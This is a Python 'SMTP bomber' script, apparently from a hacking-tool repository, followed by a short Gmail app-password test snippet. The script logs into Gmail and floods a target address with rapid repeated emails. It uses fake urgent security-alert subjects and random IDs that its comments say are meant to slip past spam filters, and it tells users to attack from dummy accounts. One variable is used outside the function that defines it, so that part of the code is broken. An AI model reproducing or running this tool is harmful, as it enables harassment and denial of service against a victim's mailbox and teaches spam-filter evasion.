#!/usr/bin/env python3
"""
EZ IDIOT RAPID BOMBER - No thinking required
"""

import smtplib
import time
import random
import sys

CYAN = "\033[36m"
RED = "\033[31m"
RESET = "\033[0m"

def print_banner():
    print(rf"""
 ____                  _   __   __
|  _ \                | |  \ \ / /
| |_) | ___  _ __ ___ | |__ \ V / 
|  _ < / _ \| '_ ` _ \| '_ \ > <  
| |_) | (_) | | | | | | |_) / . \ 
|____/ \___/|_| |_| |_|_.__/_/ \_\
-----------by erispogi------------

{RED}WARNING{RESET} sometimes the bombs of these tools cannot reach the recipient thanks to the SMTP anti-spam filter

Thanks to {CYAN}DreamsignX{RESET} to contribute : {CYAN}https://github.com/Evilginx272/Spam-gmail-bomber.git{RESET}

    """)

def rapid_bomb(gmail_user, gmail_pass, target_email, bomb_count):
    """
    Rapid bombing mode - maximum speed, minimum thinking
    """
    print(f"\n[*] Loading bomb payload...")
    print(f"[*] Target: {target_email}")
    print(f"[*] Bombs: {bomb_count}")
    print(f"[*] attacking...\n")
    time.sleep(3)
    
    smtp_server = "smtp.gmail.com"
    smtp_port = 587
    
    bomb_success = 0
    bomb_failed = 0
    
    # Ultra rapid fire loop
    for bomb_num in range(1, bomb_count + 1):
        try:
            # Connect and login
            server = smtplib.SMTP(smtp_server, smtp_port)
            server.starttls()
            server.login(gmail_user, gmail_pass)
            
            # Generate random subject to avoid spam filters
            random_id = random.randint(1000, 9999)
            subjects = [
                "URGENT: Immediate Action Required",
                "SECURITY ALERT: Account Compromise",
                "CONFIRMATION NEEDED: Verify Identity",
                "WARNING: System Failure Detected",
                "ATTENTION: Unusual Activity Found"
            ]
            subject = random.choice(subjects)
            
            # Create bomb message
            message = f"""Subject: {subject} - ID:{random_id}
From: {gmail_user}
To: {target_email}

Bomb #{bomb_num} successfully delivered.
Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}
Random Code: {random.randint(100000, 999999)}

This is an automated bombardment.
Target status: ANNIHILATED

"""
            
            # Launch bomb
            server.sendmail(gmail_user, target_email, message)
            server.quit()
            
            bomb_success += 1
            print(f"[BOMB #{bomb_num}] Email delivered.")
            
            # Ultra short delay for maximum speed (0.1-0.3 seconds)
            time.sleep(random.uniform(0.1, 0.3))
            
        except Exception as e:
            bomb_failed += 1
            print(f"[BOMB #{bomb_num}] Error: {str(e)}")
            time.sleep(1)  # Slightly longer delay on failure
    
    # Mission report
    print("\n" + "="*50)
    print("target bombed successfully!")
    print("="*50)
    print(f" Successful bombs: {bomb_success}")
    print(f" Failed bombs: {bomb_failed}")
    print(f" Accuracy rate: {round((bomb_success/bomb_count)*100, 2)}%")
    print(f" Total time: {round(time.time() - start_time, 2)} seconds")
    print("="*50)
    print("\nTarget mailbox status: ANNIHILATED")
    print("This tool was created by Erispogi and DreamsignX")
    print("Remember: use dummy accounts to attack")

def main():
    print_banner()
    
    # EZ idiot mode - just ask for basic info
    print("\nSMTP bomber toolkit")
    
    gmail_user = input("[?] Your Gmail: ")
    gmail_pass = input("[?] App Password (16 chars from Google): ")
    target_email = input("[?] Target email to bomb: ")
    
    # Default bomb count for idiots
    bomb_count = 20
    print(f"[*] Default bomb count: {bomb_count} ")
    
    # Optional: Let idiot choose count
    try:
        custom_count = input("[?] Want custom bomb count? (y/n): ")
        if custom_count.lower() == 'y':
            bomb_count = int(input("[?] How many bombs? (max 100): "))
            if bomb_count > 100:
                print("[!] Too many, setting to 100")
                bomb_count = 100
    except:
        print("[!] Invalid input, using default 20 bombs")
    
    # Start bombing
    start_time = time.time()
    rapid_bomb(gmail_user, gmail_pass, target_email, bomb_count)

if __name__  == "__main__":
    main()
 



import smtplib

# Test connection
server = smtplib.SMTP("smtp.gmail.com", 587)
server.starttls()
server.login("your@gmail.com", "yourapppasswordhere")
print("✅ App password works!")
server.quit()
